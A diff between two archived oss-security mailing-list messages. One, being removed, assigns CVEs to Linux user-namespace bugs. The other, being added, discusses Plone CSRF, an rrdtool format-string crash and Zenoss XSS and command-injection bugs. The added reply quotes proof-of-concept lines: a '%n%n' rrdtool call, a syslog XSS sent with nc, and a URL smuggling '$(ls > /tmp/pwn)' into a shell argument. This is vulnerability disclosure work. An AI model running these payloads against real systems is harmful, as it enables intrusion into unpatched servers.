@@ -1,92 +1,54 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2013/04/16/11
-Message-ID: <516D9C6E.4050305@redhat.com>
-Date: Tue, 16 Apr 2013 12:46:06 -0600
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2013/04/18/11
+Message-ID: <517052A9.60606@redhat.com>
+Date: Thu, 18 Apr 2013 14:08:09 -0600
 From: Kurt Seifried <kseifried@...hat.com>
 To: oss-security@...ts.openwall.com
-CC: Andy Lutomirski <luto@...capital.net>, Brian Martin <brian@...nsecurityfoundation.org>
-Subject: Re: Re: Summary of security bugs (now fixed) in user namespaces
+CC: Thomas Pollet <thomas.pollet@...il.com>
+Subject: Re: plone, rrdtool, zenoss bugs
 Content-Type: text/plain; charset=utf-8
 
 -----BEGIN PGP SIGNED MESSAGE-----
 Hash: SHA1
 
-On 04/16/2013 11:34 AM, Andy Lutomirski wrote:
-> On Tue, Apr 16, 2013 at 2:01 AM, Kurt Seifried
-> <kseifried@...hat.com> wrote:
->> -----BEGIN PGP SIGNED MESSAGE----- Hash: SHA1
->> 
->> On 04/15/2013 04:45 PM, Andy Lutomirski wrote:
->>> On Mon, Apr 15, 2013 at 3:34 PM, Brian Martin 
->>> <brian@...nsecurityfoundation.org> wrote:
->>>> 
->>>> Andy;
->>>> 
->>>> : I previously reported these bugs privatley.  I'm
->>>> summarizing them for
->>>> 
->>>> : the historical record.  These bugs were never exploitable
->>>> on a : default-configured released kernel, but some 3.8
->>>> versions are : vulnerable depending on configuration.
->>>> 
->>>> Do you know if these were patched, and therefore possibly 
->>>> disclosed via the commits? With these details, it is
->>>> difficult to line them up to existing reports.
->>> 
->>> Bug 1 should be fixed in:
->>> 
->>> commit 3151527ee007b73a0ebd296010f1c0454a919c7d Author: Eric
->>> W. Biederman <ebiederm@...ssion.com> Date:   Fri Mar 15
->>> 01:45:51 2013 -0700
->>> 
->>> userns:  Don't allow creation if the user is chrooted
->> 
->> Can you confirm this has no CVE?
+On 04/18/2013 06:05 AM, Thomas Pollet wrote:
+> Hi,
+> 
+> I reported a csrf bug in plone pluggable authentication service,
+> fixed in 4.2.5 http://plone.org/products/plone/releases/4.2.5 "
+> CSRF protection for the ZODBUserManager, ZODBGroupManager, 
+> ZODBRoleManger, and DynamicGroupsPlugin plugins."
 
-Please use CVE-2013-1956 for Linux Kernel namespaces userns:  Don't
-allow creation if the user is chrooted
+Was this previously exploitable, or is this just a hardening measure?
 
->> 
->>> Bug 2 is should be fixed by these:
->>> 
->>> commit 90563b198e4c6674c63672fae1923da467215f45 Author: Eric
->>> W. Biederman <ebiederm@...ssion.com> Date:   Fri Mar 22
->>> 03:10:15 2013 -0700
->>> 
->>> vfs: Add a mount flag to lock read only bind mounts
->>> 
->>> commit 132c94e31b8bca8ea921f9f96a57d684fa4ae0a9 Author: Eric
->>> W. Biederman <ebiederm@...ssion.com> Date:   Fri Mar 22
->>> 04:08:05 2013 -0700
->>> 
->>> vfs: Carefully propogate mounts across user namespaces
->> 
->> Can you confirm this has no CVE?
+> Also, the rrdtool python module crashes on format string exploit $
+> python -c "import rrdtool 
+> rrdtool.graph('/tmp/out.png','-f','%n%n')" Segmentation fault
 
-Please use CVE-2013-1957 for Linux Kernel namespaces vfs: Carefully
-propogate mounts across user namespaces
+Have you notified upstream?
 
+> this module is used by zenoss to create graphs (zenoss users are
+> able to pass arguments to rrdtool).
+> 
+> On zenoss, I reported some bugs to them (and to this list) which
+> have been fixed in the latest release (4.2.3). for example, zenoss
+> displayed syslog and snmp input without filtering html characters
+> which results in xss.
 
->> 
->>> Bug 3 should be fixed in:
->>> 
->>> commit 92f28d973cce45ef5823209aab3138eb45d8b349 Author: Eric
->>> W. Biederman <ebiederm@...ssion.com> Date:   Fri Mar 15
->>> 01:03:33 2013 -0700
->>> 
->>> scm: Require CAP_SYS_ADMIN over the current pidns to spoof
->>> pids.
->> 
->> Can you confirm this has no CVE?
->> 
+This was done via rrdtool backend, or something else as well?
 
-Please use CVE-2013-1958 for Linux Kernel namespaces scm: Require
-CAP_SYS_ADMIN over the current pidns to spoof pids
-
-
-As for the fourth bug he sent me details privately and a CVE was assigned.
-
-> --Andy
+> example syslog exploit : echo '<130>' Aug 29 07:17:34 test '<xss>'
+> | nc -u zenoss 514
+> 
+> another bug was that the test_datasource feature doesn't escape the
+> snmp oid which is passed by zenoss to the shell as an argument for
+> the snmpwalk command example: https:// 
+> [ZENOSS_HOST]/zport/dmd/Devices/rrdTemplates/Device/datasources/sysUpTime/test_datasource?data={%22newId%22:%22DetectedVirus%22,%22oid%22:%22$%28ls%20%3E%20/tmp/pwn%29%22,%22enabled%22:%22on%22,%22testDevice%22:%22127.0.0.1%22,%22uid%22:%22%22}
+>
+>  http://jira.zenoss.com/jira/browse/ZEN-3183
+> 
+> 
+> Cheers, T
 > 
 
 
@@ -96,17 +58,17 @@ PGP: 0x5E267993 A90B F995 7350 148F 66BF 7554 160D 4553 5E26 7993
 -----BEGIN PGP SIGNATURE-----
 Version: GnuPG v1.4.13 (GNU/Linux)
 
-iQIcBAEBAgAGBQJRbZxuAAoJEBYNRVNeJnmTBf0P/iSfWW//lBQGsljdiadvlbsN
-RwFJMk5K1E/fIRm6OOHZljrpsMelxQMHZHMZvyo1RE8HEHjO/v7XuWLzewFFKB3b
-N4ALuNXl3pA6fJmSCfo0WCO17ilBRiliLVcGyaW9ChHEvUQXZqwUs69wFu6uluPr
-AJjRXUbEiUI3/7SfKD7QjlAAHAuZ6EHO6zWej8Apc5LnDlyxOnEEgUfYaRulgevw
-iAb0w5e3wA+MMjuqPdxrS9hhjQTWTzUHTm+b4kXaD++5OypI/cEwNU7iuwcYEE/i
-T1WKgsDu+babpu+Izo3XjSlQIFHURB4cMyKlaNESJ+h0Rnm1l/OT+VEEWE3inWK/
-UEaFoFBUxe58oqCt+f9wouIFYB5z9fbg+mlcbtnFpb29j6xUI/hJzcbmjxwlxMp8
-0cgfYEea6dqyRxpkYoQKlowUtlfBx3omjieCLiAifY+WnGvmWgvd1FzC3zZ2nBFn
-kjwnnaFFxI9y6pX3QnXT+MFPqxNUHyVwNwc4GJErza0WfZuUBzZZk+Dfr6ZGLLGw
-FKJq2OmhI/nUES7PWGuech/UpvRrW9mJQWUnHEwyYSjCNz0pCa6UiS442pL7mutw
-G3Hs8JDMCWBHsVsetYKhEsSbdIr0qGLaVKDJKdbFN9NelZTXqgp/NRegtFNNMci3
-nU/3Fi8qsBf3m3aquJBZ
-=RRBe
+iQIcBAEBAgAGBQJRcFKpAAoJEBYNRVNeJnmTWO0P/26BYjgPDb1jRjNL84MLiD55
+fe2iGW0DjTjT8EjegE1jtjBazUdtn45Eis3ZFmgZEnTwXUBoaED43fCRKpbyu/vW
+nZBGSNkJldWR3uxEU3N14J7Ab+5K7DkpahIAta0mhEorTdtzvvjJT1+vVdibiSkd
+F/SfE2BjsgXxmlbPMjcF1WN+sF5eengDTOlCnrD7AsAXYtnexvMOMJBK+iMtdQW8
+ChrIMhef5P5d1mYRAz7vHcFwttB14aWUSQn5Fyi40FMZMAeA9XQQ9MskP7te89mu
+n9YaQvqxjnO+macpPbZZnX1xdWJU2TMiP4cDcNLgKVp1QcxoK517aJMrs2tMK2tn
+QZ7SMHDx90gBsXKytXHOIEHJHUCEQD+qxIyFEVeQeKWLx9eQNhbglMBFnw+SGgyY
+c51DRamjSlqtPHzOTntsSw7mlcdDbAEImFj+NdCxZiXMQZv3NY0+YflJe0M8/cbz
+pFiwkjla/IwddfkXgZx/YnsSkTSGOBvYs15pJTz7nXgpfLPxHQlSDX3bjTehQY+u
+kEXaycf0/QbLBDa/jxJp/SDt3RxkI2sgtcChHACrIXt2MDbpq3k1XZRwxyQT/L1A
+/PhtTAcpFbIgf5GSNdmz5i5kOIhwqtlvALA252MKV9Jd+NWOJcfOTjgHregZcSV5
+XF7qZdYV9xPLMLHZTKLU
+=7hTc
 -----END PGP SIGNATURE-----
